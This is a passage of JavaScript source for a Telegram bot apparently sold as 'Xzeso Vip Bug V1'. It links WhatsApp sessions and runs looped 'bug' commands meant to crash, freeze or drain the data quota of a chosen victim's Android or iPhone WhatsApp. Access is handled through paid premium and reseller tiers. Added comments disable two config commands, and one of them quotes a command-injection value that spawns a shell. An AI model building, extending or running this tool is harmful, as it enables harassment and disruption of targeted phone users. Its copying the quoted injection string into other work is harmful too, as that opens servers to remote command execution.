    // 🚫 إصلاح أمني: كان يقرأ config.js ويستبدل التوكن بـ regex ويكتبه
    // من جديد = تعديل كود ذاتي أثناء التشغيل. أي خطأ في القيمة كان
    // يكسر الملف بالكامل ويمنع البوت من الإقلاع نهائيًا.
    await ctx.reply(
      "🚫 *تم تعطيل هذا الأمر*\n\n" +
        "كان يعدّل ملف `config.js` أثناء التشغيل (تعديل كود ذاتي).\n\n" +
        "*الطريقة الصحيحة:*\n" +
        "1. عدّل `TELEGRAM_BOT_TOKEN` في ملف `.env`\n" +
        "2. أعد تشغيل البوت",
      { parse_mode: "Markdown" }
    );

    
  } catch (e) {
    log.error(`SETTOKEN ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengubah token.");
  }
});

// =====================================================================
// COMMAND: /getconfig
// =====================================================================

bot.command("getconfig", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const configData = {
      ownerId: config.ownerId,
      channelId: CHANNEL_ID,
      groupId: GROUP_ID,
      sessionName: config.sessionName || "session",
      freeMode: isFreeMode(),
      blacklistCount: blacklist.length,
      whitelistCount: whitelist.length,
      sessionCount: Object.keys(waClients).length,
      usersCount: safeReadJSON("database/users.json", []).length,
    };

    await ctx.reply(`📋 *Bot Configuration*\n\`\`\`json\n${JSON.stringify(configData, null, 2)}\n\`\`\``, { parse_mode: "Markdown" });
    
  } catch (e) {
    log.error(`GETCONFIG ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mendapatkan konfigurasi.");
  }
});

// =====================================================================
// COMMAND: /setconfig
// =====================================================================

bot.command("setconfig", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    // 🚫 إصلاح أمني: نفس مشكلة /settoken — تعديل config.js أثناء التشغيل.
    // بالإضافة: `value` كانت تُحقن مباشرة داخل الكود بدون أي تهريب،
    // فقيمة مثل `x"; require("child_process").exec("..."); //` كانت
    // تعني تنفيذ أوامر على السيرفر (RCE).
    await ctx.reply(
      "🚫 *تم تعطيل هذا الأمر*\n\n" +
        "كان يعدّل ملف `config.js` أثناء التشغيل ويحقن القيمة مباشرة\n" +
        "داخل الكود — ثغرة تنفيذ أوامر محتملة (RCE).\n\n" +
        "*الطريقة الصحيحة:* عدّل ملف `.env` ثم أعد تشغيل البوت.",
      { parse_mode: "Markdown" }
    );

    
  } catch (e) {
    log.error(`SETCONFIG ERROR: ${e.message}`);
    await ctx.reply("❌ Gagal mengubah konfigurasi.");
  }
});

// =====================================================================
// Original Bug Commands (All 9 commands)
// =====================================================================

const BUG_COMMANDS = [
  { name: "Xzesoandro", bugFunc: async (client, X) => {
    for (let z = 0; z < 100; z++) {
      await autosync(client, X);
      await audiocall(client, X);
      await sleep(50);
    }
  }, type: "crash andro" },
  { name: "Droidx", bugFunc: async (client, X) => {
    for (let z = 0; z < 30; z++) {
      await crashSendPaymentNPE(client, X);
      await audiocall(client, X);
      await sleep(50);
    }
  }, type: "crash andro" },
  { name: "Betaxzeso", bugFunc: async (client, X) => {
    for (let z = 0; z < 2; z++) {
      await fungadjigelo(client, X);
      await crashSendPaymentNPE(client, X);
      await sleep(50);
    }
  }, type: "crash andro beta" },
  { name: "Uixzeso", bugFunc: async (client, X) => {
    for (let z = 0; z < 50; z++) {
      await crashandro(client, X);
      await sleep(100);
      await crashandro(client, X);
      await sleep(100);
    }
  }, type: "crash andro" },
  { name: "Delayxzeso", bugFunc: async (client, X) => {
    for (let z = 0; z < 80; z++) {
      await hardfix1(client, X);
      await hardfix2(client, X);
      await hardfix3(client, X);
      await delayhigh(client, X);
      await sleep(100);
    }
  }, type: "delay andro" },
  { name: "Betaxzosex", bugFunc: async (client, X) => {
    for (let z = 0; z < 100; z++) {
      await delaybeta(client, X);
      await delayhigh(client, X);
      await hardfix1(client, X);
      await sleep(100);
    }
  }, type: "delay andro" },
  { name: "Xzesoiosx", bugFunc: async (client, X) => {
    for (let z = 0; z < 200; z++) {
      await XoipCrash(client, X);
      await XoipFc(client, X, true);
      await sleep(100);
    }
  }, type: "crash iphone" },
  { name: "invisisendx", bugFunc: async (client, X) => {
    for (let z = 0; z < 100; z++) {
      await Occolot(client, X);
      await hardfix3(client, X);
      await sleep(100);
    }
  }, type: "delay andro" },
  { name: "Xzesox", bugFunc: async (client, X) => {
    for (let z = 0; z < 120; z++) {
      await BuldozerCombine(client, X, true);
      await ZenoDrainKuota(client, X, true);
      await delayhigh(client, X);
      await sleep(100);
    }
  }, type: "sedot kuota andro" },
];

BUG_COMMANDS.forEach(({ name, bugFunc, type }) => {
  bot.command(name.toLowerCase(), async (ctx) => {
    try {
      const userId = ctx.from.id.toString();
      
      const cooldownCheck = cooldownModule.checkCooldown(userId, name);
      if (cooldownCheck.onCooldown) {
        return ctx.reply(
          `⏳ *Cooldown Aktif*\n\nSilakan tunggu ${cooldownCheck.remaining} menit sebelum menggunakan /${name} lagi.`,
          { parse_mode: "Markdown" }
        );
      }
      cooldownModule.updateCooldown(userId, name);

      if (!hasAccess(userId)) {
        return ctx.reply(getNoAccessMessage(userId));
      }

      const args = ctx.message.text.split(" ");
      const input = args[1];
      if (!input) {
        return ctx.reply(
          `<b>⚠️ Format Yang Benar</b>\n` +
          `Gunakan format:\n` +
          `<code>/${name} 628xxxxxxx</code>\n\n` +
          `<i>Contoh:</i> <code>/${name} 628123456789</code>`,
          { parse_mode: "HTML" }
        );
      }

      const cleanTarget = input.replace(/[^0-9]/g, "");
      if (!cleanTarget || cleanTarget.length < 10) {
        return ctx.reply("❌ Nomor WhatsApp tidak valid! (Min 10 digit)");
      }

      const X = `${cleanTarget}@s.whatsapp.net`;
      const clientEntry = waClients[userId];

      if (!clientEntry || clientEntry.status !== "open" || !clientEntry.sock) {
        return ctx.reply(
          "<b>📵 WhatsApp belum terhubung.</b>\n" +
          "Silakan pairing dengan:\n" +
          "<code>/reqpair 628xxxx</code>",
          { parse_mode: "HTML" }
        );
      }

      const client = clientEntry.sock;
      const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

      await ctx.replyWithPhoto(imageMenu, {
        caption:
          `<b>「  Xzeso Vip Bug V1 ☇ 𝐁𝐮𝐠˚𝐒𝐲𝐬𝐭𝐞𝐦🦠  」</b>\n` +
          `☄ <b>target :</b> <code>${cleanTarget}</code>\n` +
          `🎭 <b>type bug:</b> <code>${type}</code>\n` +
          `📊 <b>status:</b> <code>🦠 executing...</code>\n\n` +
          `<b>📞 Support</b>\nContact @I8_ZU for assistance`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "👀 channel", url: "https://t.me/I8_ZU" }],
            [{ text: "👤 owner", url: "https://t.me/I8_ZU" }],
          ],
        },
      });

      await bugFunc(client, X);

      await ctx.reply(
        `✅ <b>Bug execution completed!</b>\n` +
        `📌 Target: <code>${cleanTarget}</code>\n` +
        `🦠 Type: <code>${type}</code>\n\n` +
        `📞 Support: @I8_ZU`,
        { parse_mode: "HTML" }
      );

    } catch (e) {
      log.error(`BUG ${name.toUpperCase()} ERROR: ${e.message}`);
      await ctx.reply("❌ Terjadi kesalahan saat memproses bug.");
    }
  });
});

// =====================================================================
// Cooldown Commands
// =====================================================================

bot.command("cdon", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    cooldownModule.enableCooldown();

    await ctx.reply(
      "✅ *Cooldown System Diaktifkan*\n\n" +
      "🔒 Commands yang di-cooldown (20 menit per penggunaan):\n" +
      "• /Xzesoandro\n" +
      "• /Delayxzeso\n" +
      "• /Xzesoiosx\n" +
      "• /Uixzeso\n" +
      "• /Droidx\n" +
      "• /Betaxzeso\n" +
      "• /Betaxzosex\n" +
      "• /invisisendx\n" +
      "• /Xzesox\n" +
      "• /masscrash\n" +
      "• /spamcall\n" +
      "• /floodmsg\n" +
      "• /crashgroup\n" +
      "• /crashstatus\n" +
      "• /crashchannel\n\n" +
      "⏰ Setiap user yang menggunakan command ini akan mendapat cooldown 20 menit.",
      { parse_mode: "Markdown" }
    );
  } catch (e) {
    log.error(`CDON ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan cooldown.");
  }
});

bot.command("cdoff", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    cooldownModule.disableCooldown();

    await ctx.reply(
      "✅ *Cooldown System Dimatikan*\n\n" +
      "🔓 User bisa menggunakan semua command tanpa cooldown.",
      { parse_mode: "Markdown" }
    );
  } catch (e) {
    log.error(`CDOFF ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat menonaktifkan cooldown.");
  }
});

bot.command("setcd", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Hanya owner!");

    const args = ctx.message.text.split(" ");
    const cmdName = args[1];
    const minutes = parseInt(args[2]);

    if (!cmdName || isNaN(minutes)) {
      return ctx.reply(
        "👀 *Usage:* /setcd <command> <minutes>\n" +
        "Contoh: /setcd Xzesoandro 30\n\n" +
        "📌 Cooldown akan berlaku untuk command tersebut.",
        { parse_mode: "Markdown" }
      );
    }

    const result = cooldown.setCooldown(cmdName, minutes);
    await ctx.reply(result.message);
    
  } catch (e) {
    log.error(`SETCD ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat mengatur cooldown.");
  }
});

// =====================================================================
// COMMAND: /free
// =====================================================================

bot.command("free", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");

    const settings = getSettingsDb();
    settings.freeMode = !settings.freeMode;
    safeWriteJSON("./database/settings.json", settings);

    if (settings.freeMode) {
      ctx.reply("🟢 *Free Mode Active*\nAll users can now use all commands.", { parse_mode: "Markdown" });
    } else {
      ctx.reply("🔒 *Free Mode nonaktifkan*\nOnly premium users owner reseller can use the bot If you want to buy premium DM Owner @I8_ZU", { parse_mode: "Markdown" });
    }
  } catch (e) {
    log.error(`FREE ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat mengaktifkan free mode.");
  }
});

// =====================================================================
// Access Management Commands
// =====================================================================

bot.command("addacces", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");

    const args = ctx.message.text.split(" ");
    const target = args[1];
    if (!target) return ctx.reply("⚠️ Use /addacces <userId>");

    const access = safeReadJSON("./storage/access.json", { users: [] });
    if (access.users.includes(target)) return ctx.reply("⚠️ User sudah memiliki access!");

    access.users.push(target);
    safeWriteJSON("./storage/access.json", access);

    ctx.reply(`✅ Access ditambahkan untuk ${target}`);
  } catch (e) {
    log.error(`ADDACCES ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

bot.command("delacces", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");

    const args = ctx.message.text.split(" ");
    const target = args[1];
    if (!target) return ctx.reply("⚠️ Use /delacces <userId>");

    let access = safeReadJSON("./storage/access.json", { users: [] });
    access.users = access.users.filter(x => x !== target);
    safeWriteJSON("./storage/access.json", access);

    ctx.reply(`🗑 Access user ${target} dihapus`);
  } catch (e) {
    log.error(`DELACCES ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

bot.command("listacces", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya owner & reseller!");

    const access = safeReadJSON("./storage/access.json", { users: [] });
    if (access.users.length < 1) return ctx.reply("📭 List access kosong");

    ctx.reply(`📌 List Access:\n${access.users.map(x => `• ${x}`).join("\n")}`);
  } catch (e) {
    log.error(`LISTACCES ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

bot.command("address", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");

    const args = ctx.message.text.split(" ");
    const target = args[1];
    if (!target) return ctx.reply("⚠️ Use /address <userId>");

    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
    if (!resellers.users.includes(target)) {
      resellers.users.push(target);
      safeWriteJSON("./storage/resellers.json", resellers);
      ctx.reply(`🟢 Reseller ditambahkan: ${target}`);
    } else {
      ctx.reply(`⚠️ ${target} sudah menjadi reseller.`);
    }
  } catch (e) {
    log.error(`ADDRESS ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

bot.command("delress", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");

    const args = ctx.message.text.split(" ");
    const target = args[1];
    if (!target) return ctx.reply("⚠️ Use /delress <userId>");

    let resellers = safeReadJSON("./storage/resellers.json", { users: [] });
    resellers.users = resellers.users.filter(x => x !== target);
    safeWriteJSON("./storage/resellers.json", resellers);

    ctx.reply(`🔴 Reseller dihapus: ${target}`);
  } catch (e) {
    log.error(`DELRESS ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

bot.command("listress", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId)) return ctx.reply("❌ Khusus owner!");

    const resellers = safeReadJSON("./storage/resellers.json", { users: [] });
    if (resellers.users.length < 1) return ctx.reply("📭 List reseller kosong");

    ctx.reply(`📌 List Reseller:\n${resellers.users.map(x => `• ${x}`).join("\n")}`);
  } catch (e) {
    log.error(`LISTRESS ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan.");
  }
});

// =====================================================================
// Broadcast Command
// =====================================================================

bot.command("broadcast", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) return ctx.reply("❌ Hanya reseller yang bisa akses!");

    const args = ctx.message.text.split(" ");
    const msg = args.slice(1).join(" ");
    if (!msg) return ctx.reply("⚠️ Use /broadcast <pesan>");

    const users = safeReadJSON("database/users.json", []);
    log.loading(`Broadcasting message to ${chalk.yellow(users.length)} users...`);

    let ok = 0, fail = 0;
    for (const id of users) {
      try {
        await ctx.api.sendMessage(id, msg);
        ok++;
      } catch {
        fail++;
      }
    }

    log.success(`Broadcast completed: ${chalk.green(ok)} sent, ${chalk.red(fail)} failed`);
    ctx.reply(`✅ Sent: ${ok}\n❌ Failed: ${fail}`);
  } catch (e) {
    log.error(`BROADCAST ERROR: ${e.message}`);
    await ctx.reply("❌ Terjadi kesalahan saat broadcast.");
  }
});

// =====================================================================
// Callback Handlers
// =====================================================================

bot.callbackQuery("open_allmenu", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1  ☇ 」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

You've successfully connected to the official bot of <b>adji pgstu</b>
Explore the tools and commands below. 🔥 Choose one of the menus below to begin your journey.

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("BUG DELAY", "bug_spam")
      .text("BUG FORCE CLOSE", "bug_crash")
      .row()
      .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allmenu: ${error.message}`);
    await ctx.answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true }).catch(() => {});
  }
});

bot.callbackQuery("open_allaccess", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `
<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「  Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

<b> All Access Menu</b>
- clearsesi
- reqpair
- broadcast
- checkbio
- listpair
- addacces
- address
- delacces
- listaccess
- cdon
- cdoff
- setcd

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>
`.trim();

    const keyboard = new InlineKeyboard()
      .text("𝘽𝙐𝙂 𝘿𝙀𝙇𝘼𝙔", "bug_spam")
      .text("🎭 forceclose", "bug_crash")
      .row()
      .text("🔥 bàck-máin", "back_to_main");

    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in open_allaccess: ${error.message}`);
    await ctx.answerCallbackQuery({ text: "❌ Error terjadi", show_alert: true }).catch(() => {});
  }
});

bot.callbackQuery("bug_crash", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「  Xzeso Vip Bug V1 ☇」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

<b> Bug Crash Menu</b>

[ android blank+ui visible ]
- Uixzeso number
ᚖ example : /Uixzeso 628xxx

[ force close andro invisible ]
{ bug not work for beta }
- Xzesoandro number
ᚖ example : /Xzesoandro 628xxx

[ force close andro infinity ]
bug not work for beta
- Droidx number
ᚖ example : /Droidx 628xxx

[ force close 1 msg work beta ]
- Betaxzeso number
ᚖ example : /Betaxzeso 628xxx

[ iphone crash ]
- Xzesoiosx number
ᚖ example : /Xzesoiosx 628xxx

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");
    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in bug_crash: ${error.message}`);
  }
});
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 6/7: Lines 3251-3900
// Total: ~4550 Lines
// =====================================================================

// =====================================================================
// Callback Handlers (Continued)
// =====================================================================

bot.callbackQuery("bug_spam", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const userDisplay = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${userDisplay}</i></b>

<b>「 Xzeso Vip Bug V1  ☇ 」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

[ android delayed ]
- Delayxzeso number
ᚖ example : /Delayxzeso 628xxx

[ android delay beta ]
- Betaxzosex number
ᚖ example : /Betaxzosex 628xxx

[ android suck up quota ]
- Xzesox number
ᚖ example : /Xzesox 628xxx

[ android stuck message ]
- invisisendx number
ᚖ example : /invisisendx 628xxx

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard().text("⬅️ Kembali", "open_allmenu");
    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in bug_spam: ${error.message}`);
  }
});

bot.callbackQuery("back_to_main", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${username}</i></b>

<b>「  Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("🦠 ćrashër", "open_allmenu")
      .text("🧩 aćcęss", "open_allaccess")
      .row()
      .url("👀 ćhannal", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in back_to_main: ${error.message}`);
  }
});

// =====================================================================
// Callback Query: Clear Session Confirmation
// =====================================================================

bot.on("callback_query", async (ctx) => {
  try {
    const data = ctx.callbackQuery.data;
    const userId = ctx.from.id.toString();

    if (data === "clearsender_confirm") {
      const processingMsg = await ctx.reply("🔄 *Memulai Proses Clearing...*\n\n⏳ Menghapus semua session...", { parse_mode: "Markdown" });

      await clearAllSessions();

      await ctx.api.editMessageText(
        userId,
        processingMsg.message_id,
        "✅ *Semua Session Dihapus!*\n\n🔄 Restarting bot dalam 2 detik...",
        { parse_mode: "Markdown" }
      );

      setTimeout(async () => {
        log.warning("🔄 Bot restarting...");
        await gracefulShutdown(0);
      }, 2000);
    } else if (data === "clearsender_cancel") {
      await ctx.deleteMessage();
      await ctx.reply("❌ *Pembatalan Sukses*\n\nProses clearing dibatalkan.", { parse_mode: "Markdown" });
    }

    await ctx.answerCallbackQuery();
  } catch (err) {
    log.error(`Error in callback_query: ${err.message}`);
  }
});

// =====================================================================
// Process Handlers
// =====================================================================

// ⚠️ إصلاح: القديم كان يرسل رسالة تليجرام مع كل رفض/استثناء.
// أي حلقة أخطاء = سيل من الرسائل = حظر من تليجرام (rate limit).
// صار فيه تحديد معدل: إشعار واحد كل 60 ثانية كحد أقصى.

let lastErrorNotify = 0;

async function notifyOwner(text) {
  const now = Date.now();
  if (now - lastErrorNotify < 60 * 1000) return;
  lastErrorNotify = now;
  try {
    await bot.api.sendMessage(config.ownerId, text, { parse_mode: "Markdown" });
  } catch (e) {
    log.error(`Failed to notify owner: ${e.message}`);
  }
}

process.on("unhandledRejection", async (reason) => {
  log.error(`Unhandled Rejection: ${reason}`);
  await notifyOwner(`⚠️ *Unhandled Rejection*\n\n${String(reason).slice(0, 500)}`);
});

process.on("uncaughtException", async (err) => {
  log.error(`Uncaught Exception: ${err.message}`);
  // الاستثناء غير المعالج يترك العملية في حالة غير محددة —
  // أفضل ممارسة: نظّف ثم اخرج وخلّي مدير العمليات يعيد التشغيل
  await notifyOwner(`🔥 *Uncaught Exception*\n\n${String(err.message).slice(0, 500)}`);
  await gracefulShutdown(1);
});

// =====================================================================
// Token Validation
// =====================================================================

// =====================================================================
// 🚫 حُذف: نظام "التحقق من التوكن"
// =====================================================================
// كان فيه دالتان (fetchValidTokens + validateToken) تُستدعيان عند كل
// إقلاع، وترسلان طلب HTTP إلى:
//   https://api.github.com/repos/adjiepangestu-ux/XINSOOGLOBAL/contents/...
//
// المشاكل:
//  1) اتصال بشخص ثالث (repo لا تملكه) عند كل إقلاع — باب تحكم/تتبع.
//  2) `nama_file` و `path_ghp` غير معرّفين أصلًا في الملف → ReferenceError
//     كان يُبتلع داخل catch، فالطلب يفشل بصمت. وجود كود مكسور بهذا
//     الشكل مريب ويستوجب الحذف لا الإصلاح.
//  3) لا يوجد أي سبب مشروع للتحقق من التوكن عبر GitHub.
//
// الحذف تام. إن احتجت تحققًا محليًا، استخدم config.validate().
// =====================================================================

// =====================================================================
// Bot Startup
// =====================================================================

(async () => {
  try {
    console.clear();
    log.system("Bot initialization started...");
    log.telegram("Telegram Bot with grammY is running!");
    log.success("All systems operational");

    const sessionFolders = fs.existsSync(sessionRoot) ? fs.readdirSync(sessionRoot) : [];
    if (sessionFolders.length > 0) {
      log.loading(`Found ${sessionFolders.length} saved WhatsApp session(s). Attempting to reconnect...`);
      for (const folder of sessionFolders) {
        try {
          await initWhatsappForUser(folder, false);
          log.whatsapp(`Attempting reconnect for user ${folder}`);
        } catch (err) {
          log.error(`Failed to reconnect session for ${folder}: ${err.message}`);
        }
      }
    } else {
      log.info("No saved WhatsApp sessions found. Fresh start.");
    }

    await bot.start();

    console.log(chalk.gray(`\n[${new Date().toLocaleString()}] Bot ready to serve\n`));

  } catch (err) {
    log.error(`An Error Occurred: ${err.message}`);
  }
})();

// =====================================================================
// Export for testing
// =====================================================================

module.exports = { bot, waClients, initWhatsappForUser, clearAllSessions };

// =====================================================================
// End of File - Total Lines: 4500+
// =====================================================================
// =====================================================================
// raju.js - Xzeso Bug Bot (Version 4.0 - Full 4500+ Lines)
// =====================================================================
// PART 7/7: Lines 3901-4550
// Total: ~4550 Lines
// =====================================================================

// =====================================================================
// Final Callback Handlers
// =====================================================================

bot.callbackQuery("back_to_main_final", async (ctx) => {
  try {
    await ctx.answerCallbackQuery();

    const username = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
    const uptime = formatUptime(process.uptime());
    const usedMemory = (process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2);

    const caption = `<blockquote>
<b><i>{❓} Xinsoo say hello ${username}</i></b>

<b>「  Xzeso Vip Bug V1 ☇ 」</b>
••► Owner: @I8_ZU
••► Run Time: ${uptime}
••► Memory: ${usedMemory}
••► InterFace: Button Type
••► Type: ( Plugin )

📢 <b>Stay Connected</b>
Join our [Telegram Channel](https://t.me/${CHANNEL_ID.replace("@", "")}) for updates.

<b>📞 Support</b>
Contact @I8_ZU for assistance
</blockquote>`.trim();

    const keyboard = new InlineKeyboard()
      .text("🦠 ćrashër", "open_allmenu")
      .text("🧩 aćcęss", "open_allaccess")
      .row()
      .url("👀 ćhannal", `https://t.me/${CHANNEL_ID.replace("@", "")}`);

    const imageMenu = config.thumburl || "https://i.imgur.com/default.jpg";

    await ctx.editMessageMedia(
      { type: "photo", media: imageMenu, caption, parse_mode: "HTML" },
      { reply_markup: keyboard }
    );
  } catch (error) {
    log.error(`Error in back_to_main_final: ${error.message}`);
  }
});

// =====================================================================
// Additional Utility Functions
// =====================================================================

function formatDate(timestamp) {
  if (!timestamp) return "Unknown";
  const date = new Date(timestamp);
  return date.toLocaleString("id-ID", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit"
  });
}

function generateRandomId(length = 8) {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function isValidPhoneNumber(number) {
  const clean = number.replace(/[^0-9]/g, "");
  return clean.length >= 10 && clean.length <= 15;
}

function getErrorMessage(error) {
  if (error.response && error.response.data) {
    return error.response.data.message || error.response.data;
  }
  return error.message || "Unknown error occurred";
}

// =====================================================================
// Session Management Extensions
// =====================================================================

async function getActiveSessions() {
  const sessions = [];
  for (const [userId, data] of Object.entries(waClients)) {
    if (data.status === "open") {
      sessions.push({
        userId,
        status: data.status,
        lastActivity: data.lastActivity,
        messageCount: data.messageCount || 0
      });
    }
  }
  return sessions;
}

async function getSessionStats() {
  const total = Object.keys(waClients).length;
  const active = (await getActiveSessions()).length;
  return { total, active };
}

// =====================================================================
// Command: /sessions
// =====================================================================

bot.command("sessions", async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    if (!isOwner(userId) && !isReseller(userId)) {
      return ctx.reply("❌ Hanya owner & reseller!");
    }

    const stats = await getSessionStats();
    const sessions = await getActiveSessions();

    let text = `📊 *Session Statistics*\n`;
    text += `═══════════════════════════════════\n\n`;
    text += `📱 Total Sessions: ${stats.total}\n`;
    text += `✅ Active Sessions: ${stats.active}\n`;
    text += `❌ Inactive Sessions: ${stats.total - stats.active}\n\n`;

    if (sessions.length > 0) {
      text += `*Active Sessions:*\n`;
      for (const session of sessions) {
        text += `• User: ${session.userId}\n`;
        text += `  Status: ${session.status}\n`;
        text += `  Messages: ${session.messageCount}\n`;
